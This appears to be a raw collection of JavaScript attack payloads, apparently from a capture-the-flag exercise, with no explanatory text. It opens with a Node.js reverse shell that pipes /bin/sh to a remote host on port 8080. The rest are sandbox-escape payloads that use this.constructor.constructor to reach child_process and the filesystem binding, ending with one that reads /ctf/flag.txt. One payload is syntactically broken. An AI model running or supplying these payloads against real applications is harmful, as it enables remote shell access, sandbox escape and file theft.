(function(){var net = require("net"),cp = require("child_process"),sh = cp.spawn("/bin/sh", []);var client = new net.Socket();client.connect(8080, "192.168.1.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/; // Prevents the Node.js application form crashing})()




(this.constructor.constructor("var cp = require("child_process); return 1;"))()

(this.constructor.constructor("var err = new Error(); return err.stack"))()

function stackTrace() {
var err = new Error();
print(err.stack);
}

(this.constructor.constructor("var c = this.process.binding('child_process'); return c;"))()
(this.constructor.constructor("var fs = this.process.binding('fs'); return fs;"))()
(this.constructor.constructor("var fs = this.process.binding('fs'); return fs.open;"))()
(this.constructor.constructor("var fs = this.process.binding('fs'); var fd  = fs.open('/ctf/flag.txt', 0, 0o666, undefined, {path: '/ctf/flag.txt'}); return fd;"))()



(this.constructor.constructor("var fs = this.process.binding('fs'); var fd  = fs.open('/ctf/flag.txt', 0, 0o666, undefined, {path: '/ctf/flag.txt'}); var buffer = Buffer.alloc(100); fs.read(fd, buffer, 0, 100, -1, undefined, {});return buffer;"))()






